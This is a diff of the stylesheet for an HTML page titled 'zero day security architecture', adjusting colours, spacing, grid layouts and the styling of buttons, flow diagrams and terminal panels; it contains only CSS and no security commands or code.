@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Zero-Day Security Architecture</title>
+  <title>zero day security architecture</title>
   <link rel="icon" type="image/svg+xml" href="../favicon.svg" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
@@ -19,8 +19,9 @@
 
     :root {
       --bg-main: #03060c;
-      --bg-panel: rgba(8, 12, 24, 0.86);
-      --bg-soft: rgba(10, 17, 32, 0.78);
+      --bg-panel: rgba(8, 12, 24, 0.88);
+      --bg-soft: rgba(10, 17, 32, 0.82);
+      --bg-strong: rgba(5, 11, 22, 0.94);
       --cyan: #56f6ff;
       --green: #55ff9d;
       --amber: #ffd479;
@@ -28,7 +29,8 @@
       --blue: #7fd4ff;
       --text: #dff5ff;
       --text-dim: #8bb6cf;
-      --line: rgba(86, 246, 255, 0.2);
+      --line: rgba(86, 246, 255, 0.18);
+      --shadow: 0 16px 34px rgba(0, 0, 0, 0.34);
     }
 
     * { box-sizing: border-box; }
@@ -36,7 +38,7 @@
     body {
       margin: 0;
       min-height: 100vh;
-      padding: 22px 0 30px;
+      padding: 18px 0 28px;
       color: var(--text);
       font-family: "Space Grotesk", sans-serif;
       background-color: #020612;
@@ -56,52 +58,80 @@
         linear-gradient(rgba(86, 246, 255, 0.04) 1px, transparent 1px),
         linear-gradient(90deg, rgba(86, 246, 255, 0.03) 1px, transparent 1px);
       background-size: 34px 34px;
-      opacity: 0.22;
+      opacity: 0.2;
       z-index: 0;
     }
 
     .wrap {
-      width: min(1280px, 94vw);
+      width: min(1240px, 94vw);
       margin: 0 auto;
       position: relative;
       z-index: 1;
     }
 
-    .progress-nav {
-      position: sticky;
-      top: 10px;
-      z-index: 5;
+    .topbar {
       display: flex;
-      gap: 10px;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
       flex-wrap: wrap;
       margin-bottom: 14px;
-      padding: 10px 12px;
-      border: 1px solid var(--line);
-      border-radius: 16px;
-      background: rgba(5, 11, 22, 0.88);
-      backdrop-filter: blur(8px);
     }
 
-    .progress-chip {
-      padding: 7px 10px;
-      border-radius: 999px;
-      background: rgba(127, 212, 255, 0.08);
-      color: var(--text-dim);
+    .top-note,
+    .eyebrow,
+    .section-kicker,
+    .mini-title,
+    .code-head,
+    .tag,
+    .metric-label,
+    .summary-head,
+    .detail-title {
       font: 12px "Share Tech Mono", monospace;
-      letter-spacing: 0.05em;
+      letter-spacing: 0.06em;
       text-transform: uppercase;
     }
 
+    .top-note {
+      color: var(--text-dim);
+    }
+
+    .back-link,
+    button {
+      appearance: none;
+      border: 1px solid rgba(86, 246, 255, 0.24);
+      background: rgba(6, 11, 22, 0.94);
+      color: var(--cyan);
+      border-radius: 12px;
+      padding: 10px 14px;
+      text-decoration: none;
+      cursor: pointer;
+      font: 12px "Share Tech Mono", monospace;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+      transition: border-color 0.2s ease, background 0.2s ease, transform 0.2s ease;
+    }
+
+    .back-link:hover,
+    button:hover,
+    button.active {
+      border-color: var(--green);
+      background: rgba(8, 16, 32, 0.98);
+      transform: translateY(-1px);
+    }
+
     .hero,
-    .section {
+    .section,
+    .rail-card,
+    .callout {
       border: 1px solid var(--line);
       border-radius: 22px;
       background: var(--bg-panel);
-      box-shadow: 0 18px 38px rgba(0, 0, 0, 0.36);
+      box-shadow: var(--shadow);
     }
 
     .hero {
-      padding: 26px;
+      padding: 22px;
       margin-bottom: 18px;
       overflow: hidden;
       position: relative;
@@ -120,132 +150,126 @@
     .eyebrow {
       display: inline-flex;
       align-items: center;
-      gap: 10px;
-      padding: 8px 14px;
+      gap: 8px;
+      padding: 7px 12px;
       border-radius: 999px;
-      border: 1px solid rgba(255, 212, 121, 0.35);
+      border: 1px solid rgba(255, 212, 121, 0.3);
       background: rgba(39, 24, 10, 0.55);
       color: var(--amber);
-      font: 13px "Share Tech Mono", monospace;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
+    }
+
+    .hero-grid {
+      display: grid;
+      gap: 18px;
+      grid-template-columns: 1.35fr 0.9fr;
+      align-items: start;
+      margin-top: 14px;
     }
 
     h1 {
-      margin: 16px 0 12px;
+      margin: 12px 0 8px;
       color: var(--cyan);
       font-family: "DepartureMono-Regular", "Share Tech Mono", monospace;
-      font-size: clamp(34px, 5vw, 54px);
+      font-size: clamp(24px, 3vw, 34px);
       font-weight: 400;
-      line-height: 1.08;
-      letter-spacing: 0.03em;
-      text-shadow: 0 0 14px rgba(86, 246, 255, 0.28);
+      line-height: 1.05;
+      letter-spacing: 0.02em;
+      text-shadow: 0 0 12px rgba(86, 246, 255, 0.18);
     }
 
-    .hero-desc {
-      margin: 0 0 20px;
-      max-width: 820px;
+    .hero-copy {
+      margin: 0;
+      max-width: 760px;
       color: var(--text-dim);
-      font-size: 17px;
-      line-height: 1.7;
+      font-size: 14px;
+      line-height: 1.6;
     }
 
-    .takeaway-banner {
-      display: inline-flex;
-      align-items: center;
+    .hero-panel {
+      padding: 18px;
+      border-radius: 18px;
+      background: var(--bg-soft);
+      border: 1px solid rgba(86, 246, 255, 0.14);
+    }
+
+    .hero-panel h2,
+    .section h2 {
+      margin: 8px 0 10px;
+      color: var(--cyan);
+      font-family: "Share Tech Mono", monospace;
+    }
+
+    .hero-panel h2 {
+      font-size: 20px;
+      line-height: 1.2;
+    }
+
+    .hero-panel p,
+    .hero-panel li,
+    .section p,
+    .rail-card p,
+    .rail-card li,
+    .detail-body,
+    .panel-copy,
+    .mini-body,
+    .walk-step,
+    .decision-col li,
+    .takeaway-list li,
+    .hardening-list li,
+    .repro-list li {
+      color: var(--text-dim);
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .tag-row,
+    .metrics,
+    .button-row {
+      display: flex;
       gap: 10px;
-      margin: 2px 0 4px;
-      padding: 10px 14px;
-      border-radius: 14px;
-      border: 1px solid rgba(85, 255, 157, 0.25);
-      background: rgba(13, 31, 22, 0.78);
-      color: #dfffe7;
-      font: 700 13px "Share Tech Mono", monospace;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
+      flex-wrap: wrap;
     }
 
-    .hero-top {
-      display: grid;
-      gap: 18px;
-      grid-template-columns: 1.45fr 0.95fr;
-      align-items: start;
+    .tag {
+      padding: 6px 10px;
+      border-radius: 999px;
+      color: var(--blue);
+      background: rgba(10, 18, 30, 0.72);
+      border: 1px solid rgba(127, 212, 255, 0.2);
+      font-size: 11px;
     }
 
     .metrics {
+      margin-top: 14px;
       display: grid;
-      gap: 14px;
+      gap: 12px;
       grid-template-columns: repeat(3, minmax(0, 1fr));
-      margin-top: 18px;
     }
 
     .metric {
-      padding: 16px;
-      border-radius: 18px;
-      background: rgba(9, 16, 30, 0.88);
-      border: 1px solid rgba(86, 246, 255, 0.16);
-    }
-
-    .metric-label {
-      color: var(--text-dim);
-      font: 12px "Share Tech Mono", monospace;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
+      padding: 14px;
+      border-radius: 16px;
+      border: 1px solid rgba(86, 246, 255, 0.14);
+      background: rgba(9, 16, 30, 0.9);
     }
 
     .metric-value {
-      margin-top: 8px;
+      margin-top: 7px;
       color: #f4fbff;
-      font: 700 28px "Share Tech Mono", monospace;
+      font: 700 22px "Share Tech Mono", monospace;
     }
 
     .metric-sub {
       margin-top: 6px;
       color: var(--text-dim);
-      font-size: 14px;
-    }
-
-    .summary-table {
-      display: grid;
-      gap: 12px;
-      grid-template-columns: 1fr 1fr;
-    }
-
-    .summary-cell {
-      padding: 14px;
-      border-radius: 16px;
-      background: rgba(8, 15, 28, 0.82);
-      border: 1px solid rgba(86, 246, 255, 0.12);
-    }
-
-    .summary-head {
-      margin: 0 0 8px;
-      color: #f7fbff;
-      font: 700 13px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .summary-cell ul {
-      margin: 0;
-      padding-left: 18px;
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.65;
-    }
-
-    .hero-panel {
-      padding: 18px;
-      border-radius: 20px;
-      background: rgba(10, 17, 32, 0.86);
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      display: grid;
-      gap: 16px;
+      font-size: 13px;
+      line-height: 1.45;
     }
 
     .timeline {
       display: grid;
       gap: 10px;
+      margin: 14px 0;
     }
 
     .timeline-bar {
@@ -262,7 +286,6 @@
       width: var(--timeline, 0%);
       border-radius: inherit;
       background: linear-gradient(90deg, var(--red), var(--amber), var(--green));
-      transition: width 0.35s ease;
     }
 
     .timeline-legend {
@@ -270,764 +293,558 @@
       justify-content: space-between;
       gap: 8px;
       color: var(--text-dim);
-      font: 12px "Share Tech Mono", monospace;
-    }
-
-    .button-row {
-      display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-
-    button,
-    .back-link {
-      appearance: none;
-      border: 1px solid rgba(86, 246, 255, 0.4);
-      background: rgba(6, 11, 22, 0.92);
-      color: var(--cyan);
-      border-radius: 12px;
-      padding: 10px 16px;
-      font: 13px "Share Tech Mono", monospace;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      cursor: pointer;
-      transition: border-color 0.2s ease, color 0.2s ease, transform 0.2s ease, background 0.2s ease;
-    }
-
-    button:hover,
-    .back-link:hover,
-    button.active {
-      border-color: var(--green);
-      color: var(--green);
-      transform: translateY(-1px);
-    }
-
-    .button-critical {
-      border-color: rgba(255, 107, 129, 0.45);
-      color: #ff9dad;
-    }
-
-    .button-critical.active,
-    .button-critical:hover {
-      border-color: var(--red);
-      color: #ffc3cd;
-      background: rgba(48, 12, 20, 0.85);
+      font: 11px "Share Tech Mono", monospace;
     }
 
     .layout {
       display: grid;
       gap: 18px;
-      grid-template-columns: 1fr 340px;
+      grid-template-columns: 1fr 300px;
+      align-items: start;
     }
 
-    .stack {
+    .stack,
+    .side-rail {
       display: grid;
       gap: 18px;
     }
 
-    .section {
+    .side-rail {
+      position: sticky;
+      top: 16px;
+    }
+
+    .section,
+    .rail-card,
+    .callout {
       padding: 22px;
     }
 
     .section-kicker {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      margin-bottom: 10px;
       color: var(--amber);
-      font: 12px "Share Tech Mono", monospace;
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
+      margin-bottom: 8px;
+      font-size: 15px;
     }
 
     .section h2 {
-      margin: 0 0 12px;
-      color: var(--cyan);
-      font: 700 22px "Share Tech Mono", monospace;
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
+      font-size: clamp(15px, 1.8vw, 19px);
+      line-height: 1.3;
+      font-weight: 500;
     }
 
-    .section p {
-      margin: 0;
-      color: var(--text-dim);
-      font-size: 16px;
-      line-height: 1.65;
-    }
-
-    .split {
+    .split,
+    .compare-grid,
+    .detect-compare,
+    .example-layout {
       display: grid;
-      gap: 18px;
-      grid-template-columns: 1.1fr 0.9fr;
-      align-items: start;
+      gap: 14px;
+      grid-template-columns: 1fr 1fr;
+      margin-top: 14px;
+    }
+
+    .card-grid,
+    .walkthrough-strip,
+    .impact-grid {
+      display: grid;
+      gap: 14px;
+      margin-top: 14px;
     }
 
     .card-grid {
-      display: grid;
-      gap: 14px;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      grid-template-columns: repeat(3, minmax(0, 1fr));
     }
 
-    .mini-card {
-      padding: 16px;
+    .walkthrough-strip {
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+    }
+
+    .impact-grid {
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+    }
+
+    .mini-card,
+    .detail-panel,
+    .terminal,
+    .log-panel,
+    .json-panel,
+    .code-card,
+    .impact-box,
+    .summary-cell,
+    .decision-col,
+    .architecture-detail,
+    .workflow-detail {
+      border: 1px solid var(--line);
       border-radius: 18px;
       background: var(--bg-soft);
-      border: 1px solid rgba(86, 246, 255, 0.12);
-      display: grid;
-      gap: 10px;
+      min-width: 0;
     }
 
-    .mini-title {
+    .detail-panel,
+    .terminal,
+    .log-panel,
+    .json-panel,
+    .code-card,
+    .architecture-detail,
+    .workflow-detail {
+      padding: 18px;
+    }
+
+    .mini-card,
+    .impact-box,
+    .summary-cell,
+    .decision-col,
+    .architecture-detail,
+    .workflow-detail {
+      padding: 16px;
+    }
+
+    .mini-title,
+    .summary-head,
+    .detail-title {
       color: #f4fbff;
-      font: 700 15px "Share Tech Mono", monospace;
+      margin-bottom: 8px;
     }
 
-    .mini-body {
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.55;
-    }
-
-    .attack-flow {
+    .attack-flow,
+    .architecture-grid,
+    .automation-steps {
       display: grid;
       gap: 12px;
+      margin-top: 14px;
     }
 
     .flow-row {
       display: flex;
-      gap: 12px;
-      flex-wrap: wrap;
+      gap: 10px;
+      flex-wrap: nowrap;
       align-items: center;
-    }
-
-    .flow-node {
-      position: relative;
-      min-width: 160px;
-      padding: 14px 16px;
-      border-radius: 16px;
-      border: 1px solid rgba(86, 246, 255, 0.16);
-      background: rgba(8, 16, 32, 0.9);
-      cursor: pointer;
-      transition: border-color 0.2s ease, transform 0.2s ease;
-      overflow: hidden;
-    }
-
-    .flow-node.attack {
-      border-color: rgba(255, 107, 129, 0.28);
-      background: rgba(46, 14, 24, 0.8);
-    }
-
-    .flow-node.detect {
-      border-color: rgba(255, 212, 121, 0.28);
-      background: rgba(46, 30, 10, 0.8);
-    }
-
-    .flow-node.contain {
-      border-color: rgba(85, 255, 157, 0.28);
-      background: rgba(12, 36, 24, 0.8);
-    }
-
-    .flow-node:hover,
-    .flow-node.active {
-      border-color: var(--cyan);
-      transform: translateY(-1px);
-    }
-
-    .flow-node strong {
-      display: block;
-      color: #f2fbff;
-      font: 700 14px "Share Tech Mono", monospace;
-      margin-bottom: 6px;
-    }
-
-    .flow-node span {
-      color: var(--text-dim);
-      font-size: 13px;
-      line-height: 1.5;
-    }
-
-    .flow-arrow {
-      color: var(--cyan);
-      font: 14px "Share Tech Mono", monospace;
-    }
-
-    .detail-panel,
-    .log-panel,
-    .json-panel,
-    .terminal,
-    .graph-panel,
-    .impact-map,
-    .automation-map {
-      border-radius: 18px;
-      background: rgba(6, 11, 22, 0.92);
-      border: 1px solid rgba(86, 246, 255, 0.14);
-    }
-
-    .detail-panel,
-    .json-panel,
-    .graph-panel,
-    .impact-map,
-    .automation-map {
-      padding: 16px;
-    }
-
-    .detail-title,
-    .panel-title {
-      margin: 0 0 10px;
-      color: #f7fbff;
-      font: 700 14px "Share Tech Mono", monospace;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-    }
-
-    .micro-copy {
-      margin: 0 0 14px;
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.6;
-    }
-
-    .decision-table {
-      display: grid;
-      gap: 12px;
-      grid-template-columns: 1fr 1fr;
-    }
-
-    .decision-col {
-      padding: 16px;
-      border-radius: 18px;
-      background: rgba(8, 15, 28, 0.82);
-      border: 1px solid rgba(86, 246, 255, 0.14);
-    }
-
-    .decision-col h3 {
-      margin: 0 0 10px;
-      color: #f7fbff;
-      font: 700 14px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .decision-col ul {
-      margin: 0;
-      padding-left: 18px;
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.7;
-    }
-
-    .detail-body,
-    .panel-copy {
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.6;
-    }
-
-    .architecture {
-      display: grid;
-      gap: 14px;
-      grid-template-columns: repeat(5, minmax(0, 1fr));
-    }
-
-    .arch-node {
-      position: relative;
-      padding: 16px;
-      border-radius: 18px;
-      border: 1px solid rgba(86, 246, 255, 0.16);
-      background: rgba(8, 15, 30, 0.88);
-      cursor: pointer;
-      min-height: 160px;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
-      overflow: hidden;
-    }
-
-    .arch-node:hover,
-    .arch-node.active {
-      border-color: var(--green);
-      box-shadow: 0 0 0 1px rgba(85, 255, 157, 0.12) inset;
-    }
-
-    .arch-node h3 {
-      margin: 0 0 8px;
-      color: #effbff;
-      font: 700 15px "Share Tech Mono", monospace;
-    }
-
-    .arch-node p {
-      margin: 0;
-      color: var(--text-dim);
-      font-size: 13px;
-      line-height: 1.55;
-    }
-
-    .arch-tags {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-      margin-top: 12px;
-    }
-
-    .arch-tag {
-      padding: 4px 8px;
-      border-radius: 999px;
-      background: rgba(127, 212, 255, 0.1);
-      color: var(--blue);
-      font: 11px "Share Tech Mono", monospace;
-    }
-
-    .terminal,
-    .log-panel {
-      padding: 0;
-      overflow: hidden;
-    }
-
-    .term-head {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 10px;
-      padding: 12px 14px;
-      border-bottom: 1px solid rgba(86, 246, 255, 0.14);
-      background: rgba(11, 17, 30, 0.94);
-      color: var(--text-dim);
-      font: 12px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-
-    .term-body,
-    .log-body,
-    .json-body {
-      font: 13px/1.6 "Share Tech Mono", monospace;
-      white-space: pre-wrap;
-    }
-
-    .term-body,
-    .log-body {
-      padding: 14px;
-      min-height: 180px;
-      color: #d9f7dd;
-    }
-
-    .json-body {
-      margin: 0;
-      padding: 14px;
-      color: #ffd78a;
-      overflow-x: auto;
-    }
-
-    .log-body {
-      color: #dbe9ff;
-      max-height: 220px;
-      overflow: auto;
-    }
-
-    details.tech-details {
-      border-radius: 18px;
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      background: rgba(6, 11, 22, 0.82);
-      overflow: hidden;
-    }
-
-    details.tech-details > summary {
-      list-style: none;
-      cursor: pointer;
-      padding: 14px 16px;
-      color: var(--cyan);
-      font: 13px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-      border-bottom: 1px solid rgba(86, 246, 255, 0.12);
-    }
-
-    details.tech-details > summary::-webkit-details-marker {
-      display: none;
-    }
-
-    .code-grid {
-      display: grid;
-      gap: 14px;
-      grid-template-columns: 1fr 1fr;
-      padding: 14px;
-    }
-
-    .code-card {
-      border-radius: 16px;
-      border: 1px solid rgba(86, 246, 255, 0.12);
-      background: rgba(8, 15, 28, 0.82);
-      overflow: hidden;
-    }
-
-    .code-head {
-      padding: 12px 14px;
-      border-bottom: 1px solid rgba(86, 246, 255, 0.1);
-      color: var(--cyan);
-      font: 12px "Share Tech Mono", monospace;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      background: rgba(10, 18, 32, 0.9);
-    }
-
-    .code-card pre {
-      margin: 0;
-      padding: 14px;
-      color: #ffd78a;
-      font: 12px/1.65 "Share Tech Mono", monospace;
-      overflow-x: auto;
-    }
-
-    .walkthrough-strip {
-      display: grid;
-      gap: 10px;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      margin-bottom: 14px;
-    }
-
-    .walk-step {
-      padding: 14px;
-      border-radius: 16px;
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      background: rgba(8, 15, 28, 0.82);
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.55;
-    }
-
-    .walk-step strong {
-      display: block;
-      margin-bottom: 6px;
-      color: #f7fbff;
-      font: 700 13px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .toggle-row {
-      display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
-      margin-bottom: 14px;
-    }
-
-    .detect-compare {
-      display: grid;
-      gap: 14px;
-      grid-template-columns: 1fr 1fr;
-    }
-
-    .detect-box {
-      padding: 16px;
-      border-radius: 18px;
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      background: rgba(8, 15, 28, 0.82);
-    }
-
-    .detect-box h3,
-    .impact-box h3 {
-      margin: 0 0 8px;
-      color: #f6fbff;
-      font: 700 14px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .detect-box ul,
-    .takeaway-list,
-    .hardening-list,
-    .repro-list {
-      margin: 0;
-      padding-left: 18px;
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.7;
-    }
-
-    .network-stage {
-      position: relative;
-      min-height: 290px;
-      border-radius: 18px;
-      background:
-        radial-gradient(circle at center, rgba(86, 246, 255, 0.06), transparent 48%),
-        rgba(8, 15, 28, 0.88);
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      overflow: hidden;
-    }
-
-    .network-node {
-      position: absolute;
-      width: 124px;
-      min-height: 74px;
-      padding: 10px 12px;
-      border-radius: 16px;
-      border: 1px solid rgba(86, 246, 255, 0.18);
-      background: rgba(7, 13, 24, 0.94);
-      display: grid;
-      gap: 6px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.24);
-    }
-
-    .network-node strong {
-      color: #f2fbff;
-      font: 700 13px "Share Tech Mono", monospace;
-    }
-
-    .network-node span {
-      color: var(--text-dim);
-      font-size: 12px;
-      line-height: 1.45;
-    }
-
-    .network-line {
-      position: absolute;
-      height: 2px;
-      background: rgba(86, 246, 255, 0.22);
-      transform-origin: left center;
-    }
-
-    .network-line.blocked {
-      background:
-        repeating-linear-gradient(
-          90deg,
-          rgba(255, 107, 129, 0.85) 0 10px,
-          transparent 10px 18px
-        );
-    }
-
-    .impact-grid {
-      display: grid;
-      gap: 14px;
-      grid-template-columns: repeat(3, minmax(0, 1fr));
-      margin-bottom: 16px;
-    }
-
-    .impact-box {
-      padding: 16px;
-      border-radius: 18px;
-      background: rgba(8, 15, 28, 0.84);
-      border: 1px solid rgba(86, 246, 255, 0.12);
-    }
-
-    .impact-value {
-      color: #f7fbff;
-      font: 700 28px "Share Tech Mono", monospace;
-    }
-
-    .heatmap {
-      display: grid;
-      gap: 10px;
-      grid-template-columns: repeat(6, minmax(0, 1fr));
-    }
-
-    .heat {
-      min-height: 70px;
-      border-radius: 14px;
-      padding: 10px;
-      display: grid;
-      align-content: end;
-      border: 1px solid rgba(255,255,255,0.08);
-      color: #eaf8ff;
-      font: 12px "Share Tech Mono", monospace;
-    }
-
-    .heat.low { background: linear-gradient(180deg, rgba(85, 255, 157, 0.18), rgba(25, 66, 44, 0.9)); }
-    .heat.guard { background: linear-gradient(180deg, rgba(86, 246, 255, 0.18), rgba(12, 43, 56, 0.92)); }
-    .heat.mid { background: linear-gradient(180deg, rgba(255, 212, 121, 0.22), rgba(76, 53, 18, 0.92)); }
-    .heat.high { background: linear-gradient(180deg, rgba(255, 147, 84, 0.26), rgba(78, 37, 18, 0.94)); }
-    .heat.critical { background: linear-gradient(180deg, rgba(255, 107, 129, 0.28), rgba(85, 18, 33, 0.96)); }
-
-    .automation-steps {
-      display: grid;
-      gap: 12px;
-      grid-template-columns: repeat(5, minmax(0, 1fr));
-    }
-
-    .automation-step {
-      position: relative;
-      padding: 16px;
-      border-radius: 16px;
-      background: rgba(8, 15, 28, 0.84);
-      border: 1px solid rgba(86, 246, 255, 0.12);
-      cursor: pointer;
-      transition: border-color 0.2s ease;
-      overflow: hidden;
-    }
-
-    .flow-node::before,
-    .arch-node::before,
-    .automation-step::before {
-      content: "";
-      position: absolute;
-      inset: -1px;
-      border-radius: inherit;
-      background:
-        radial-gradient(
-          140px circle at var(--glow-x, 50%) var(--glow-y, 50%),
-          rgba(86, 246, 255, 0.26),
-          rgba(86, 246, 255, 0.1) 28%,
-          transparent 72%
-        );
-      opacity: 0;
-      transition: opacity 0.18s ease;
-      pointer-events: none;
-    }
-
-    .flow-node:hover::before,
-    .flow-node.active::before,
-    .arch-node:hover::before,
-    .arch-node.active::before,
-    .automation-step:hover::before,
-    .automation-step.active::before {
-      opacity: 1;
-    }
-
-    .automation-step.active,
-    .automation-step:hover {
-      border-color: var(--cyan);
-    }
-
-    .automation-step strong {
-      display: block;
-      margin-bottom: 8px;
-      color: #f7fbff;
-      font: 700 13px "Share Tech Mono", monospace;
-      text-transform: uppercase;
-      letter-spacing: 0.05em;
-    }
-
-    .automation-step span {
-      color: var(--text-dim);
-      font-size: 13px;
-      line-height: 1.55;
-    }
-
-    .single-line-diagram {
-      display: flex;
-      gap: 12px;
-      align-items: stretch;
       overflow-x: auto;
       padding-bottom: 4px;
       scrollbar-width: thin;
     }
 
-    .diagram-box {
-      min-width: 170px;
+    .flow-node,
+    .arch-button,
+    .automation-step {
+      appearance: none;
+      text-align: left;
+      border: 1.5px solid rgba(86, 246, 255, 0.2);
+      background: rgba(8, 15, 28, 0.9);
+      border-radius: 14px;
+      padding: 13px 14px;
+      cursor: pointer;
+      transition: border-color 0.2s ease, background 0.2s ease, transform 0.2s ease;
+    }
+
+    .flow-node:hover,
+    .flow-node.active,
+    .arch-button:hover,
+    .arch-button.active,
+    .automation-step:hover,
+    .automation-step.active {
+      border-color: var(--green);
+      background: rgba(8, 18, 32, 0.96);
+      transform: translateY(-1px);
+    }
+
+    .flow-node.attack { border-color: rgba(255, 107, 129, 0.5); }
+    .flow-node.detect { border-color: rgba(255, 212, 121, 0.48); }
+    .flow-node.contain { border-color: rgba(85, 255, 157, 0.48); }
+
+    .flow-node strong,
+    .arch-button strong,
+    .automation-step strong {
+      display: block;
+      margin-bottom: 5px;
+      color: #f2fbff;
+      font: 700 12px "Share Tech Mono", monospace;
+      white-space: nowrap;
+    }
+
+    .flow-node span,
+    .arch-button span,
+    .automation-step span {
+      color: var(--text-dim);
+      font-size: 11px;
+      line-height: 1.35;
+      white-space: nowrap;
+    }
+
+    .flow-arrow {
+      color: var(--cyan);
+      font: 12px "Share Tech Mono", monospace;
+    }
+
+    .single-line-diagram {
+      display: flex;
+      gap: 10px;
+      align-items: stretch;
+      overflow-x: auto;
+      padding-bottom: 4px;
+      margin-top: 14px;
+    }
+
+    .diagram-node {
+      min-width: 168px;
+      padding: 15px 16px;
+      border-radius: 14px;
+      border: 1.8px solid var(--line);
+      background: rgba(8, 15, 28, 0.9);
+    }
+
+    .diagram-node strong {
+      display: block;
+      margin-bottom: 7px;
+      color: #f4fbff;
+      font: 700 13px "Share Tech Mono", monospace;
+      white-space: nowrap;
+    }
+
+    .diagram-node span {
+      color: var(--text-dim);
+      font-size: 12px;
+      line-height: 1.45;
+      white-space: nowrap;
+    }
+
+    .diagram-node.red { border-color: rgba(255, 107, 129, 0.55); }
+    .diagram-node.amber { border-color: rgba(255, 212, 121, 0.55); }
+    .diagram-node.green { border-color: rgba(85, 255, 157, 0.55); }
+    .diagram-node.blue { border-color: rgba(127, 212, 255, 0.55); }
+    .diagram-node.cyan { border-color: rgba(86, 246, 255, 0.55); }
+
+    .diagram-arrow {
+      align-self: center;
+      color: var(--cyan);
+      font: 14px "Share Tech Mono", monospace;
+      min-width: 12px;
+      text-align: center;
+    }
+
+    .term-head {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      align-items: center;
+      padding: 12px 14px;
+      border-bottom: 1px solid rgba(86, 246, 255, 0.12);
+      background: rgba(10, 18, 32, 0.94);
+      color: var(--text-dim);
+      font: 12px "Share Tech Mono", monospace;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .replay-index {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-top: 14px;
+    }
+
+    .index-button {
+      min-width: 42px;
+      padding: 9px 11px;
+      text-align: center;
+    }
+
+    .term-body,
+    .log-body,
+    .json-body,
+    pre {
+      margin: 0;
       padding: 16px;
-      border-radius: 16px;
-      background: rgba(8, 15, 28, 0.84);
-      border: 1px solid rgba(86, 246, 255, 0.12);
+      color: #dbe9ff;
+      font: 12px/1.68 "Share Tech Mono", monospace;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow: visible;
+      max-width: 100%;
+    }
+
+    .json-body,
+    pre {
+      color: #ffd78a;
+      background: #081a33;
+    }
+
+    .json-panel,
+    .code-card {
+      overflow: hidden;
+    }
+
+    .json-panel .code-head,
+    .code-card .code-head {
+      padding: 13px 16px;
+      border-bottom: 1px solid rgba(86, 246, 255, 0.14);
+      background: rgba(10, 18, 32, 0.94);
+    }
+
+    .decision-table,
+    .summary-table {
+      display: grid;
+      gap: 14px;
+      grid-template-columns: 1fr 1fr;
+      margin-top: 14px;
+    }
+
+    .decision-col ul,
+    .summary-cell ul,
+    .takeaway-list,
+    .hardening-list,
+    .repro-list,
+    .detail-list {
+      margin: 0;
+      padding-left: 18px;
       display: grid;
       gap: 8px;
     }
 
-    .diagram-box.red {
-      border-color: rgba(255, 107, 129, 0.26);
-      background: rgba(46, 14, 24, 0.82);
+    .impact-value {
+      color: #f4fbff;
+      font: 700 24px "Share Tech Mono", monospace;
+      margin: 8px 0;
+      display: block;
     }
 
-    .diagram-box.amber {
-      border-color: rgba(255, 212, 121, 0.26);
-      background: rgba(46, 30, 10, 0.82);
+    .rail-card h3,
+    .callout h3,
+    .impact-box h3,
+    .decision-col h3,
+    .summary-cell h3,
+    .architecture-detail h3,
+    .workflow-detail h3 {
+      margin: 0 0 10px;
+      color: #f4fbff;
+      font: 700 15px "Share Tech Mono", monospace;
     }
 
-    .diagram-box.green {
-      border-color: rgba(85, 255, 157, 0.26);
-      background: rgba(12, 36, 24, 0.82);
-    }
-
-    .diagram-box.blue {
-      border-color: rgba(127, 212, 255, 0.26);
-      background: rgba(14, 26, 42, 0.82);
-    }
-
-    .diagram-box.cyan {
-      border-color: rgba(86, 246, 255, 0.26);
-      background: rgba(8, 25, 34, 0.82);
-    }
-
-    .diagram-box strong {
-      color: #f7fbff;
-      font: 700 13px "Share Tech Mono", monospace;
-      letter-spacing: 0.05em;
-      text-transform: uppercase;
-    }
-
